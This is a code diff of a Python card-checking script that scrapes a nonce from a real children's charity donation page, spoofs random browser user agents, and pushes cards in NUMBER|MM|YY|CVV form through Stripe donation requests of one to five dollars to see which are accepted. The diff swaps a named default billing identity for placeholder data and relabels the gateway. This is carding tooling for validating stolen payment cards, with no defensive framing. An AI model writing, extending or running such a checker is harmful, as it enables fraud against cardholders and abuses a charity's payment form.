@@ -1,37 +1,33 @@
-# cc.py
 import requests
 from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
-import re
+import json
+from datetime import datetime
 
 class StripeProcessor:
     def __init__(self):
         self.ua = UserAgent()
 
-    def process_card(self, ccx):
+    def process_card_at(self, ccx, billing_info=None):
         ccx = ccx.strip()
         try:
             n, mm, yy, cvc = ccx.split("|")
         except ValueError:
-            return {
-                "status": "DECLINED", 
-                "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
-                "gateway": "Site Based [1$]"
-            }
+            return {"status": "Declined", "response": "Invalid card format", "gateway": "Authnet [5$]"}
 
         if "20" in yy:
             yy = yy.split("20")[1]
 
         user_agent = self.ua.random
 
-        return self._process_needhelped(n, mm, yy, cvc, user_agent)
+        return self._process_needhelped(n, mm, yy, cvc, user_agent, billing_info)
 
     def fetch_nonce_and_cookie(self, user_agent):
         url = 'https://needhelped.com/campaigns/poor-children-donation-4/donate/'
         headers = {'User-Agent': user_agent}
 
         session = requests.Session()
-        response = session.get(url, headers=headers, timeout=10)
+        response = session.get(url, headers=headers)
         soup = BeautifulSoup(response.text, 'html.parser')
 
         nonce_input = soup.find('input', {'name': '_charitable_donation_nonce'})
@@ -42,22 +38,23 @@ class StripeProcessor:
         cookies = session.cookies.get_dict()
         return nonce, cookies
 
-    def _process_needhelped(self, n, mm, yy, cvc, user_agent):
+    def _process_needhelped(self, n, mm, yy, cvc, user_agent, billing_info):
         try:
-            # Default billing info
-            billing_info = {
-                'name': 'Dark boy',
-                'email': 'Darkboy336@gmail.com',
-                'first_name': 'Dark',
-                'last_name': 'boy',
-                'address': '123 Main St',
-                'city': 'New York',
-                'state': 'NY',
-                'postcode': '10001',
-                'country': 'US',
-                'phone': '5551234567',
-                'amount': '1.00'
-            }
+            # Default billing info if not provided
+            if not billing_info:
+                billing_info = {
+                    'name': 'John Doe',
+                    'email': 'user@example.com',
+                    'first_name': 'John',
+                    'last_name': 'Doe',
+                    'address': '123 Main St',
+                    'city': 'New York',
+                    'state': 'NY',
+                    'postcode': '10001',
+                    'country': 'US',
+                    'phone': '5551234567',
+                    'amount': '5.00'
+                }
 
             # Create payment method
             payment_data = {
@@ -112,7 +109,7 @@ class StripeProcessor:
             # Get donation nonce
             nonce, cookies = self.fetch_nonce_and_cookie(user_agent)
             if not nonce:
-                return {"status": "DECLINED", "response": "Failed to process payment", "gateway": "Site Based [1$]"}
+                return {"status": "Declined", "response": "Failed to process payment", "gateway": "Authnet [5$]"}
 
             # Process donation
             donation_data = {
@@ -156,7 +153,6 @@ class StripeProcessor:
             )
             resp_json = donation_response.json()
             
-            # Process response
             if isinstance(resp_json, dict):
                 if 'requires_action' in resp_json and resp_json['requires_action']:
                     return {"status": "DECLINED", "response": "OTP_Required", "gateway": "Site Based [1$]"}
@@ -173,18 +169,9 @@ class StripeProcessor:
             return {"status": "ERROR", "response": "TIMEOUT_ERROR", "gateway": "Site Based [1$]"}
         except Exception as e:
             return {"status": "ERROR", "response": f"Processing Failed: {str(e)}", "gateway": "Site Based [1$]"}
-
+            
 # Create global processor instance
-processor = StripeProcessor()
+processor_at = StripeProcessor()
 
-def check_cc_card(cc):
-    """Check Site Based status for a single card"""
-    # Basic CC format validation
-    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
-        return {
-            "response": "Invalid card format. Use CC|MM|YYYY|CVV",
-            "status": "DECLINED",
-            "gateway": "Site Based [1$]"
-        }
-    
-    return processor.process_card(cc)
+def check_cc_card(ccx):
+    return processor_at.process_card_at(ccx)
